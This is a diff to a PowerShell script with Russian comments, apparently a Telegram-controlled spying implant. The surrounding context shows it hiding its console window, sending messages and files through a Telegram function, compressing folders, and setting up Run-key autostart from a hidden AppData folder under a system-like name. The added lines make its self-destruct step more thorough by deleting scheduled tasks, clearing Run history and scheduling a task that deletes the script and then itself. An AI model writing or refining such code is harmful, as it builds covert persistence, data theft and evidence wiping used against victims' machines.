@@ -16,6 +16,11 @@ $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(in
 $windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
 $windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null
 
+# Удаляем старые задачи планировщика при запуске
+try {
+    Get-ScheduledTask | Where-Object {$_.TaskName -like "Cleanup_*"} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+} catch {}
+
 # Функция отправки сообщений с правильной кодировкой
 function Send-Telegram {
     param([string]$Message, [string]$FilePath = $null)
@@ -113,7 +118,7 @@ function Compress-Folder {
 
 # Установка в автозагрузку с защитой от очистки TEMP
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptName = "WindowsSystem_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".exe"
+$scriptName = "WindowsSystem_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".ps1"
 
 # Создаем скрытую папку в AppData
 $hiddenDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
@@ -233,6 +238,14 @@ $($fileList -join "`n")"
                             $success = $true
                             $report = "Отчет самоуничтожения:"
                             
+                            # Удаляем старые задачи планировщика
+                            try {
+                                Get-ScheduledTask | Where-Object {$_.TaskName -like "Cleanup_*"} | Unregister-ScheduledTask -Confirm:$false -ErrorAction Stop
+                                $report += "`n✓ Старые задачи планировщика удалены"
+                            } catch {
+                                $report += "`n⚠ Не удалось удалить старые задачи планировщика"
+                            }
+                            
                             # Очистка истории RUN
                             try {
                                 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
@@ -271,14 +284,14 @@ $($fileList -join "`n")"
                                 $report += "`n✗ Ошибка удаления файлов"
                             }
                             
-                            # Удаление текущего скрипта через планировщик
+                            # Удаление текущего скрипта через планировщик с самоликвидацией
                             try {
                                 $currentScript = $MyInvocation.MyCommand.Path
                                 $taskName = "Cleanup_" + (Get-Random -Minimum 1000 -Maximum 9999)
-                                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c timeout 3 && del `"$currentScript`" /f /q"
+                                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c timeout 3 >nul && del `"$currentScript`" /f /q && schtasks /delete /tn `"$taskName`" /f"
                                 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
                                 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction Stop
-                                $report += "`n✓ Задача удаления текущего файла создана"
+                                $report += "`n✓ Задача удаления текущего файла создана (самоудалится после выполнения)"
                             } catch {
                                 $report += "`n⚠ Не удалось создать задачу удаления текущего файла"
                             }
